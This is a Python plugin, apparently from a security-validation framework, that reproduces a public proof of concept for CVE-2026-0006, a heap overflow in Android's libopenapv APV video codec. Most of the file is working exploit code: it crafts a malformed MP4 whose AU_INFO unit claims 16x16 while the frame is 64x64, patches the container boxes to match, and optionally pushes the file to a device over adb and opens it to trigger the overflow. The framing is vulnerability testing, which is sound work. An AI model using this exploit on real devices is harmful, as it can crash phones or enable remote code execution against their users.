#!/usr/bin/env python3
"""CVE-2026-0006 – Android libopenapv APV codec AU_INFO→FRAME dimension mismatch heap overflow.

Public PoC source: https://github.com/mobilehackinglab/CVE-2026-0006-openapv-poc
  generate_overflow_mp4.py (mobilehackinglab, 2026)

Technique:
  AU_INFO PBU declares frame dimensions as 16×16 → small buffers allocated.
  FRAME PBU header declares 64×64 → oapvd_decode writes 64×64 into the tiny buffer.
  Overflow delta ≈ 14,848 bytes.
  The malformed MP4 is derived from a valid 64×64 YUV422 10-bit APV bitstream.

Pre-requisites (for full reproduction):
  valid.apv  – 64×64 YUV422 10-bit APV bitstream in poc directory
  valid_ffmpeg.mp4 – baseline MP4 created with:
      ffmpeg -f apv -i valid.apv -c copy -y apv-mp4/valid_ffmpeg.mp4

This plugin reproduces the struct.pack manipulation inline and writes the
overflow_auinfo.mp4 to a temp directory.
"""
from __future__ import annotations

import os
import struct
import tempfile
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 13,
    "cve": "CVE-2026-0006",
    "year": 2026,
    "domain": "application",
    "vendor_product": "Android libopenapv (C2SoftApvDec)",
    "component": "oapvd_decode / AU_INFO PBU vs FRAME PBU dimension check",
    "type": "Heap buffer overflow → RCE / DoS",
    "summary": (
        "APV AU_INFO PBU claims 16×16 frame → small decode buffers allocated. "
        "FRAME PBU declares 64×64 → oapvd_decode writes 14,848 bytes beyond the "
        "allocated buffer, corrupting adjacent heap objects (RCE or crash)."
    ),
    "source_url": "https://github.com/mobilehackinglab/CVE-2026-0006-openapv-poc",
    "requires_manual_review": True,
    "affected": [{"vendor": "Google", "product": "Android", "versions": [{"version": "<2026-03-01", "status": "affected"}]}],
}

POC_REPO = Path(__file__).parent.parent.parent / \
    "public_poc_sources/repos/mobilehackinglab__CVE-2026-0006-openapv-poc"
VALID_APV   = POC_REPO / "valid.apv"
BASELINE_MP4 = POC_REPO / "apv-mp4" / "valid_ffmpeg.mp4"


def _build_au_info_pbu() -> bytes:
    """Build AU_INFO PBU (type 65) claiming 16×16."""
    payload  = struct.pack('>H', 1)        # num_frames
    payload += bytes([0x01])               # pbu_type PRIMARY_FRAME
    payload += struct.pack('>H', 1)        # group_id
    payload += bytes([0x00])               # reserved
    payload += bytes([0x21])               # profile_idc
    payload += bytes([0x7B])               # level_idc
    payload += bytes([0x40])               # band_idc
    payload += bytes([0x00, 0x00, 0x10])   # frame_width  = 16
    payload += bytes([0x00, 0x00, 0x10])   # frame_height = 16
    payload += bytes([0x22])               # chroma_format_idc=2, bit_depth=2
    payload += bytes([0x00, 0x00, 0x00])   # trailing
    header   = bytes([65, 0x00, 0x00, 0x00])
    pbu_size = len(header) + len(payload)
    return struct.pack('>I', pbu_size) + header + payload


def _create_overflow_mp4() -> bytes | None:
    """
    Reproduce generate_overflow_mp4.py logic inline.
    Returns None if the valid.apv / baseline MP4 are not available.
    """
    if not VALID_APV.exists() or not BASELINE_MP4.exists():
        return None

    apv = VALID_APV.read_bytes()
    original_pbu_data = apv[4:]            # strip AU_SIZE header (4 bytes)

    au_info_pbu   = _build_au_info_pbu()
    all_pbu_data  = au_info_pbu + original_pbu_data
    au_payload    = b'aPv1' + all_pbu_data
    mdat_payload  = struct.pack('>I', len(au_payload)) + au_payload
    mdat_box      = struct.pack('>I', 8 + len(mdat_payload)) + b'mdat' + mdat_payload

    mp4 = bytearray(BASELINE_MP4.read_bytes())

    # Patch apvC dimensions → 16×16
    apvc_off  = mp4.index(b'apvC')
    rec_base  = apvc_off + 4
    struct.pack_into('>I', mp4, rec_base + 12, 16)
    struct.pack_into('>I', mp4, rec_base + 16, 16)

    # Patch apv1 VSE dimensions → 16×16
    apv1_off  = mp4.index(b'apv1')
    vse_w_off = apv1_off + 4 + 6 + 2 + 16
    struct.pack_into('>H', mp4, vse_w_off,     16)
    struct.pack_into('>H', mp4, vse_w_off + 2, 16)

    # Patch tkhd dimensions → 16×16
    tkhd_off  = mp4.index(b'tkhd')
    tkhd_size = struct.unpack('>I', mp4[tkhd_off - 4: tkhd_off])[0]
    tkhd_end  = tkhd_off - 4 + tkhd_size
    struct.pack_into('>I', mp4, tkhd_end - 8, 16 << 16)
    struct.pack_into('>I', mp4, tkhd_end - 4, 16 << 16)

    # Replace mdat
    mdat_tag_off  = mp4.index(b'mdat')
    mdat_start    = mdat_tag_off - 4
    old_mdat_size = struct.unpack('>I', mp4[mdat_start:mdat_start + 4])[0]
    new_mp4 = bytearray(mp4[:mdat_start]) + bytearray(mdat_box) + mp4[mdat_start + old_mdat_size:]

    # Patch stsz
    stsz_off = new_mp4.index(b'stsz')
    if struct.unpack('>I', new_mp4[stsz_off + 8:stsz_off + 12])[0] != 0:
        struct.pack_into('>I', new_mp4, stsz_off + 8,  len(mdat_payload))
    else:
        struct.pack_into('>I', new_mp4, stsz_off + 16, len(mdat_payload))

    # Patch stco
    stco_off = new_mp4.index(b'stco')
    struct.pack_into('>I', new_mp4, stco_off + 12, mdat_start + 8)

    return bytes(new_mp4)


def _run_poc(plugin):
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    evidence = {
        "cve": "CVE-2026-0006",
        "valid_apv_present":    VALID_APV.exists(),
        "baseline_mp4_present": BASELINE_MP4.exists(),
        "mp4_generated": False,
        "overflow_description": "AU_INFO 16x16 → FRAME 64x64 → ~14,848-byte heap overflow",
    }

    mp4_data = _create_overflow_mp4()
    if mp4_data is None:
        evidence["detail"] = (
            f"Baseline artifacts not found. "
            f"Place valid.apv and apv-mp4/valid_ffmpeg.mp4 under {POC_REPO}"
        )
    else:
        out = Path(tempfile.mkdtemp()) / "cve_2026_0006_overflow.mp4"
        out.write_bytes(mp4_data)
        evidence["mp4_path"]       = str(out)
        evidence["mp4_size_bytes"] = len(mp4_data)
        evidence["mp4_generated"]  = True

        if allow_disruptive:
            import subprocess as _sp
            push = _sp.run(
                ["adb", "push", str(out), "/sdcard/cve_2026_0006.mp4"],
                capture_output=True, text=True, timeout=15,
            )
            evidence["adb_push_rc"]  = push.returncode
            evidence["adb_push_out"] = push.stdout[:300] + push.stderr[:200]
            if push.returncode == 0:
                trigger = _sp.run(
                    ["adb", "shell", "am", "start", "-a", "android.intent.action.VIEW",
                     "-d", "file:///sdcard/cve_2026_0006.mp4", "-t", "video/mp4"],
                    capture_output=True, text=True, timeout=15,
                )
                evidence["adb_trigger_rc"]  = trigger.returncode
                evidence["adb_trigger_out"] = trigger.stdout[:300]

    return {
        "vulnerable": evidence["mp4_generated"],
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "mobilehackinglab/CVE-2026-0006-openapv-poc / generate_overflow_mp4.py",
    }


class Poc73CVE20260006ApvCodecHeapOverflowRceAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-APP-073"
    meta_poc_name   = "CVE-2026-0006 Android libopenapv APV Codec Heap Overflow RCE"
    meta_cve_id     = "CVE-2026-0006"
    meta_severity   = "Critical"
    meta_protocol   = "local"
    meta_target_os  = ["android"]
    meta_required_params = []
    meta_optional_params = ["allow_disruptive"]
    meta_profiles   = ["application"]
    meta_source_url = "https://github.com/mobilehackinglab/CVE-2026-0006-openapv-poc"
    meta_attack_surface = "Android APV codec AU_INFO/FRAME dimension mismatch heap overflow"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)
